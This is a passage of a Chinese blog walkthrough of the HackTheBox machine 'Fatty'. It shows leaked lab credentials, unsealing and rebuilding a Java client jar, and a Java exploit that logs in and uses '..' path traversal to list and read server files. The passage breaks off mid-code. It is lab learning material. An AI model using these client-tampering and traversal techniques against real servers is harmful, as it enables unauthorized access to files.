<!DOCTYPE html>
<html>
<head hexo-theme='https://volantis.js.org/#@byc_404'>
  <meta charset="utf-8">
  <!-- SEO相关 -->
  
    
  
  <!-- 渲染优化 -->
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <!-- 页面元数据 -->
  
    <title>hackthebox-Fatty-JavaExploits - byc_404&#39;s blog</title>
  
    <meta name="keywords" content="hackthebox,pentest,Java">
  
  
    <meta name="description" content=" Faaty 是htb这周刚退役的靶机。本来一周前自己打算下手试试的,不过做了一会发现因为即将退役就干脆搁置等ippsec出视频自己再做233. 不过整体来说这台靶机真的非常有趣。并且涉及到大量的java知识。在这一次实际操作中自己才真正体会到前段时间巩固java开发的基础知识有多么重要。因此这里记录下具体操作的...">
  

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="byc_404's blog">
  

  <!-- import meta -->
  

  <!-- link -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">

  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">

  

  
  <link rel="shortcut icon" type='image/x-icon' href="/assests/favicon.ico">
  

  

  

  <!-- import link -->
  

  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/css/style.css">

  

  <script>
    function setLoadingBarProgress(num) {
      document.getElementById('loading-bar').style.width=num+"%";
    }
  </script>

  
  
</head>

<body>
  
  <div class="cover-wrapper">
    
      <cover class='cover post half'>
        <div class='cover-body'>
  <div class='a'>
    
    
      <p class="title">byc_404's blog</p>
    
    
      <p class="subtitle">Do not go gentle into that good night</p>
    
  </div>
  <div class='b'>
    
      <div class="m_search">
        <form name="searchform" class="form u-search-form">
          <input type="text" class="input u-search-input" placeholder="" />
          <i class="icon fas fa-search fa-fw"></i>
        </form>
      </div>
    
    <div class='menu navigation'>
      <ul class='cover-list-h'>
        
      </ul>
    </div>
  </div>
</div>

      </cover>
    
    <div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>
<header class="l_header shadow blur">
  <div class='container'>
  <div class='wrapper'>
    <div class='nav-sub'>
      <p class="title"></p>
      <ul class='switcher nav-list-h'>
        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
        
          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
        
      </ul>
    </div>
		<div class="nav-main">
      
        
        <a class="title flat-box" target="_self" href='/'>
          
          
          
          
            IGNITE <b><sup style='color:#3AA757'>@byc_404</sup></b>
          
        </a>
      

			<div class='menu navigation'>
				<ul class='nav-list-h'>
          
          
          
            
            
              <li>
                <a class="flat-box" href=/
                  
                  
                  
                    id="home"
                  >
                  <i class='fas fa-rss fa-fw'></i>博客
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/categories/
                  
                  
                  
                    id="categories"
                  >
                  <i class='fas fa-folder-open fa-fw'></i>分类
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/tags/
                  
                  
                  
                    id="tags"
                  >
                  <i class='fas fa-tags fa-fw'></i>标签
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/archives/
                  
                  
                  
                    id="archives"
                  >
                  <i class='fas fa-archive fa-fw'></i>归档
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/friends/
                  
                  
                  
                    id="friends"
                  >
                  <i class='fas fa-link fa-fw'></i>友链
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/about/
                  
                  
                  
                    id="about"
                  >
                  <i class='fas fa-info-circle fa-fw'></i>关于
                </a>
                
              </li>
            
          
          
				</ul>
			</div>

      <div class="m_search">
        <form name="searchform" class="form u-search-form">
          <i class="icon fas fa-search fa-fw"></i>
          <input type="text" class="input u-search-input" placeholder="Search..." />
        </form>
      </div>

			<ul class='switcher nav-list-h'>
				
					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
				
				<li>
          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
          <ul class="menu-phone list-v navigation white-box">
            
              
            
              <li>
                <a class="flat-box" href=/
                  
                  
                  
                    id="home"
                  >
                  <i class='fas fa-rss fa-fw'></i>博客
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="flat-box" href=/categories/
                  
                  
                  
                    id="categories"
                  >
                  <i class='fas fa-folder-open fa-fw'></i>分类
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="flat-box" href=/tags/
                  
                  
                  
                    id="tags"
                  >
                  <i class='fas fa-tags fa-fw'></i>标签
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="flat-box" href=/archives/
                  
                  
                  
                    id="archives"
                  >
                  <i class='fas fa-archive fa-fw'></i>归档
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="flat-box" href=/friends/
                  
                  
                  
                    id="friends"
                  >
                  <i class='fas fa-link fa-fw'></i>友链
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="flat-box" href=/about/
                  
                  
                  
                    id="about"
                  >
                  <i class='fas fa-info-circle fa-fw'></i>关于
                </a>
                
              </li>
            
          
            
          </ul>
        </li>
			</ul>
		</div>
	</div>
  </div>
</header>

<script>setLoadingBarProgress(40);</script>

  </div>


  <div class="l_body">
    <div class='body-wrapper'>
      

<div class='l_main'>
  

  
    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
      


  <section class='meta'>
    
      
      
      <div class="meta" id="header-meta">
        
          
  <h1 class="title">
    <a href="/2020/08/10/hackthebox-Fatty-JavaExploits/">
      hackthebox-Fatty-JavaExploits
    </a>
  </h1>


        
        <div class='new-meta-box'>
          
            
          
            
              
<div class='new-meta-item author'>
  <a href="https://www.bycsec.top" rel="nofollow">
    <img src="/assests/favicon.ico">
    <p>byc_404</p>
  </a>
</div>

            
          
            
              

            
          
            
              <div class="new-meta-item date">
  <a class='notlink'>
    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>发布于：Aug 10, 2020</p>
  </a>
</div>

            
          
            
          
        </div>
        
          <hr>
        
      </div>
    
  </section>


      <section class="article typo">
        <div class="article-entry" itemprop="articleBody">
          
          <p> Faaty 是htb这周刚退役的靶机。本来一周前自己打算下手试试的,不过做了一会发现因为即将退役就干脆搁置等ippsec出视频自己再做233. 不过整体来说这台靶机真的非常有趣。并且涉及到大量的java知识。在这一次实际操作中自己才真正体会到前段时间巩固java开发的基础知识有多么重要。因此这里记录下具体操作的流程,将学到的新知识巩固一下。</p>
<a id="more"></a>

<p> 当然。这次实际操作途中还是有一处困扰着我的地方没有找到好的答案。就是idea中能否重新导入单个java文件并修改引入jar包中class的内容。</p>
<p> <img src="/2020/08/10/hackthebox-Fatty-JavaExploits/head.PNG" alt></p>
<ul>
<li>靶机ip: 10.10.10.174</li>
<li>攻击机: 10.10.14.25</li>
</ul>
<h2 id="initial-foothold-to-user"><a href="#initial-foothold-to-user" class="headerlink" title="initial-foothold to user"></a>initial-foothold to user</h2><p>首先nmap简单扫的结果只有21,22端口。21端口允许匿名登录。其中有4个文件。一个jar包与三个note</p>
<p>note.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Dear members, </span><br><span class="line">because of some security issues we moved the port of our fatty java server from 8000 to the hidden and undocumented port 1337. Furthermore, we created two new instances of the server on port 1338 and 1339. They offer exactly the same server and it would be nice if you use different servers from day to day to balance the server load. </span><br><span class="line">We were too lazy to fix the default port in the &#39;.jar&#39; file, but since you are all senior java developers you should be capable of doing it yourself ;)</span><br><span class="line">Best regards, qtc</span><br></pre></td></tr></table></figure>

<p>从这里我们可以看到。远程应该开放了1337,1338,1339端口来作为服务端。然后我们自己用jar包当客户端。</p>
<p>同时这里涉及到一个java thick client的概念。简单说就是数据处理有很大一部分由客户端完成。</p>
<p>note2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Dear members, </span><br><span class="line">we are currently experimenting with new java layouts. The new client uses a static layout. If your are using a tiling window manager or only have a limited screen size, try to resize the client window until you see the login from.</span><br><span class="line">Furthermore, for compatibility reasons we still rely on Java 8. Since our company workstations ship Java 11 per default, you may need to install it manually.</span><br><span class="line">Best regards, qtc</span><br></pre></td></tr></table></figure>

<p>note2 提示我们使用java8.</p>
<p>note3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Dear members, </span><br><span class="line">We had to remove all other user accounts because of some seucrity issues. Until we have fixed these issues, you can use my account:</span><br><span class="line">User: qtc Pass: clarabibi</span><br><span class="line">Best regards, qtc</span><br></pre></td></tr></table></figure>

<p>note3则直接提供给我们一组可行的账号。至此note已经看完。ftp服务上还剩下一个fatty-client.jar。我们下载下来进行审计</p>
<p>开始我是直接拿到本机的idea上看jar包的。首先结构上应该是spring框架编写功能+swing组件编写gui。但是并没有太大收获。比如常见如<code>readObject</code>这样的反序列化函数我并没有见到。但是却有<code>writeObject</code>存在。说明可能readObject这一操作是在服务端进行的。那么我们还是先尝试直接使用这个jar包。看看哪里有漏洞可寻。</p>
<p>首先注意,题目要求环境java8。所以kali可以很好的解决这个问题。我们直接使用<code>/usr/lib/jvm/java-8-openjdk-amd64/bin/java</code>调用jar包即可。</p>
<p><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/0.PNG" alt></p>
<p>从界面以及源码都能看出来这是一个用java swing组件写出来的gui界面。</p>
<p>首先尝试登录。但不出所料果然回显<code>Connection Error</code>。这点我们从jar包的beans.xml可以看出</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = "1.0" encoding = "UTF-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">                http://www.springframework.org/schema/beans     </span></span></span><br><span class="line"><span class="tag"><span class="string">                spring-beans-3.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Here we have an constructor based injection, where Spring injects required arguments inside the</span></span><br><span class="line"><span class="comment">	 constructor function. --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"connectionContext"</span> <span class="attr">class</span> = <span class="string">"htb.fatty.shared.connection.ConnectionContext"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">"0"</span> <span class="attr">value</span> = <span class="string">"server.fatty.htb"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">"1"</span> <span class="attr">value</span> = <span class="string">"8000"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">   </span><br><span class="line"><span class="comment">&lt;!-- The next to beans use setter injection. For this kind of injection one needs to define an default</span></span><br><span class="line"><span class="comment">constructor for the object (no arguments) and one needs to define setter methods for the properties. --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"trustedFatty"</span> <span class="attr">class</span> = <span class="string">"htb.fatty.shared.connection.TrustedFatty"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"keystorePath"</span> <span class="attr">value</span> = <span class="string">"fatty.p12"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"secretHolder"</span> <span class="attr">class</span> = <span class="string">"htb.fatty.shared.connection.SecretHolder"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"secret"</span> <span class="attr">value</span> = <span class="string">"clarabibiclarabibiclarabibi"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--  For out final bean we use now again constructor injection. Notice that we use now ref instead of val --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"connection"</span> <span class="attr">class</span> = <span class="string">"htb.fatty.client.connection.Connection"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span> = <span class="string">"0"</span> <span class="attr">ref</span> = <span class="string">"connectionContext"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span> = <span class="string">"1"</span> <span class="attr">ref</span> = <span class="string">"trustedFatty"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span> = <span class="string">"2"</span> <span class="attr">ref</span> = <span class="string">"secretHolder"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>bean的配置中存在server.fatty.htb 并配置端口8000.因此我们需要将这个hostname加入/etc/hosts.不过此处我们有两种方法。一种是直接更改jar包并重新使用。另一种是使用代理转发下流量。我因为偷懒选择了第二种。</p>
<p>即,在hosts 文件中设置为<code>127.0.0.1 server.fatty.htb</code>并使用socat转发本地8000的流量到10.10.10.147:1337上</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:8000,fork TCP:10.10.10.174:1337</span><br></pre></td></tr></table></figure>
<p>当然。第一种方法也是可行的。但是实际非常麻烦。假如我们只是解压jar包，更改beans.xml再重新压缩位jar包的话<br><code>jar -uf fatty-client.jar beans.xml</code>。<br>再次运行将会发现出现java security problems。为什么呢？这是因为整个jar包中有部分配置文件会因为sha256变化的beans.xml出错,这跟java seal 的操作有关。一旦相关文件变化，将导致抛出Sealing Violation。所以我们必须删掉内容中记录了sha256值的文件并设定配置。</p>
<p>操作方法<br>METAINF/MANIFEST.MF 中底下所有sha256相关内容全部去掉，同时上面设置中<code>Sealed: True</code>这一行去掉。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0 </span><br><span class="line">Archiver-Version: Plexus Archiver </span><br><span class="line">Built-By: root </span><br><span class="line">Created-By: Apache Maven 3.3.9 </span><br><span class="line">Build-Jdk: 1.8.0_232 </span><br><span class="line">Main-Class: htb.fatty.client.run.Starter</span><br></pre></td></tr></table></figure>
<p>接着删掉META-INF/1.RSA META-INF/1.SF 两个同样含有sha256值的文件。重新更新jar包文件即可。(或者直接zip打包)</p>
<p>当然。虽然我开始没有进行这步操作,后面还是一样要做的。</p>
<p>然后现在我们可以跟服务进行交互了。<br>使用直接note中<code>qtc:clarabibi</code>成功登录后。试了一下几个操作发现还是没有什么收获。我们所在的用户组有ping,whoami,configs这样几个操作。其中configs执行的似乎是服务端列目录的工作。gui底下有一个按钮open,可以输入对应文件名读取服务端目录的文件。尝试open功能时fuzz触发了报错<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/1.PNG" alt></p>
<p>似乎<code>..</code>这样的操作可以进行一,两层路径穿越。但是并不能达成任意列目录。因为它过滤了<code>../..</code>。</p>
<p>看了下源码。列目录对应的应该是这里<br>Invoker中的showfiles</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">showFiles</span><span class="params">(String folder)</span> <span class="keyword">throws</span> MessageParseException, MessageBuildException, IOException </span>&#123;</span><br><span class="line">    String methodName = (<span class="keyword">new</span> Object() &#123;</span><br><span class="line">    &#125;).getClass().getEnclosingMethod().getName();</span><br><span class="line">    logger.logInfo(<span class="string">"[+] Method '"</span> + methodName + <span class="string">"' was called by user '"</span> + <span class="keyword">this</span>.user.getUsername() + <span class="string">"'."</span>);</span><br><span class="line">    <span class="keyword">if</span> (AccessCheck.checkAccess(methodName, <span class="keyword">this</span>.user)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Error: Method '"</span> + methodName + <span class="string">"' is not allowed for this user account"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.action = <span class="keyword">new</span> ActionMessage(<span class="keyword">this</span>.sessionID, <span class="string">"files"</span>);</span><br><span class="line">        <span class="keyword">this</span>.action.addArgument(folder);</span><br><span class="line">        <span class="keyword">this</span>.sendAndRecv();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.response.hasError() ? <span class="string">"Error: Your action caused an error on the application server!"</span> : <span class="keyword">this</span>.response.getContentAsString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而我们gui中对应configs的操作是</p>
<p><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/2.PNG" alt><br>可见。此处原本设定了目录为configs.但倘若我们修改其为<code>..</code>是否就能路径穿越了呢？不妨一试。<br>参照ippsec视频,这里我们为了方便节省手动操作时间,而不是反复修改源码重新build jar包(然而打脸了,后面重新build了两次……)不如直接导入jar包并编写exp.</p>
<p>于是这里我去下了一个linux 上的idea.不得不吐槽配置ide环境居然也出了小问题 =&gt;  idea无法自动识别<code>/usr/lib/jvm</code>中的jdk.必须执行<code>sudo apt-get install openjdk-8-jdk</code>后。idea才能自动识别jvm中的java8.</p>
<p>我们创建一个环境为java8的工程。并在library中导入fatty-client.jar。</p>
<p>按照ippsec的思路简单写一个利用exp</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> htb.fatty.client.connection.Connection;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.client.methods.Invoker;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.shared.message.MessageBuildException;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.shared.message.MessageParseException;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.shared.resources.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  IOException</span>&#123;</span><br><span class="line">        Connection conn = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            conn = Connection.getConnection();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            System.out.println(<span class="string">"[-] connection failed"</span>+e.getMessage());</span><br><span class="line">            System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"[+] Successfully connected"</span>);</span><br><span class="line"></span><br><span class="line">        User user=<span class="keyword">new</span> User(<span class="string">"qtc"</span>,<span class="string">"clarabibi"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(conn.login(user))&#123;</span><br><span class="line">            System.out.println(<span class="string">"[+] Successfully logged in"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"[-] Login failed"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String rolename=conn.getRoleName();</span><br><span class="line">        user.setRoleByName(rolename);</span><br><span class="line">        System.out.println(<span class="string">"[+] rolename is: "</span>+rolename);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Invoker invoker =new Invoker(conn,user);</span></span><br><span class="line"><span class="comment">        String response="";</span></span><br><span class="line"><span class="comment">        try &#123;</span></span><br><span class="line"><span class="comment">            response=invoker.showFiles("..");</span></span><br><span class="line"><span class="comment">        &#125; catch (MessageParseException e) &#123;</span></span><br><span class="line"><span class="comment">            e.printStackTrace();</span></span><br><span class="line"><span class="comment">        &#125; catch (MessageBuildException e) &#123;</span></span><br><span class="line"><span class="comment">            e.printStackTrace();</span></span><br><span class="line"><span class="comment">        &#125; catch (IOException e) &#123;</span></span><br><span class="line"><span class="comment">            e.printStackTrace();</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        System.out.println("Server response:\n"+ response);</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/3.PNG" alt></p>
<p>这样我们就能通过java代码来跟服务端交互了。同时比较方便的是。我们可以直接修改传入的值来节省时间<br>比如上面代码注释的部分即是invoker调用showFiles方法并获取回显。并且我们直接就可以修改传入的参数为<code>..</code>进行路径穿越.得到以下文件。<br>(try catch 直接用idea快捷键添加即可。非常方便)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Server response:</span><br><span class="line">logs</span><br><span class="line">tar</span><br><span class="line">start.sh</span><br><span class="line">fatty-server.jar</span><br><span class="line">files</span><br></pre></td></tr></table></figure>
<p>接下来使用open方法读文件。我们把invoker调用的方法改为<code>open(&quot;..&quot;,&quot;start.sh&quot;)</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Unfortunately alpine docker containers seems to have problems with services.</span></span><br><span class="line"><span class="comment"># I tried both, ssh and cron to start via openrc, but non of them worked. Therefore, </span></span><br><span class="line"><span class="comment"># both services are now started as part of the docker startup script.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start cron service</span></span><br><span class="line">crond -b</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start ssh server</span></span><br><span class="line">/usr/sbin/sshd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start Java application server</span></span><br><span class="line">su - qtc /bin/sh -c <span class="string">"java -jar /opt/fatty/fatty-server.jar"</span></span><br></pre></td></tr></table></figure>
<p>看来服务端运行的就是fatty-server.jar了.为了搞清楚服务端究竟做了什么操作。比如为什么我们用户组user权限有些方法调用不了,要怎么变为admin权限。服务端是否又调用了readObject呢？这些都需要对server的源码审计。</p>
<p>然而问题在于。我们并没有办法利用现有的方法获取服务jar包的完整数据。因为open方法调用的是</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    response = <span class="keyword">this</span>.response.getContentAsString();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">    response = <span class="string">"Unable to convert byte[] to String. Did you read in a binary file?"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>即使不知道服务端是怎么读文件的。但是我们知道回显的内容是对this.respoonse调用<code>getContentAsString()</code>来将内容转为字符串。那么读取jar包这种二进制文件时必然会有不可见字符被直接忽视。导致我们获取的文件不完整。那么必须重写open方法。让它能直接将response内容写进本机。</p>
<p>然后这里就是比较头疼的一处了。我知道eclipse可以直接import 现有一个java文件作依赖然后重写调用(前提是执行了前面的unseal过程。即删除了rsa,sf,修改了mf)。但是idea我一直没找到好的调用方法。希望有大佬能教教我idea怎么处理最优…..</p>
<p>总之最后。我选择了直接重写代码再build jar包的方法。虽然有点蠢但是至少可行。首先我们直接获取文件内容并写入。因此在open方法中加入以下代码。<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/4.PNG" alt></p>
<p>当然直接新创建一个方法写文件并在exp中使用invoker调用也是可以的。</p>
<p>然后就是这次学到的命令行下重新build一个jar包的完整流程</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">javac -cp fatty-client.jar htb/fatty/client/methods/Invoker.java</span><br><span class="line">mkdir raw </span><br><span class="line">cp fatty-client.jar raw/fatty-client.jar </span><br><span class="line"><span class="built_in">cd</span> raw &amp;&amp; unzip fatty-client.jar</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">mv htb/fatty/client/methods/*.class raw/htb/fatty/client/methods/</span><br><span class="line"><span class="built_in">cd</span> raw &amp;&amp; jar -cmf META-INF/MANIFEST.MF fatty.jar .</span><br></pre></td></tr></table></figure>
<p>比较闹心的是。因为之前用idea自动反编译的内容,导致源码的java文件找不到。我还得重新反编译一下jar包……然后修改Invoker.java。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> 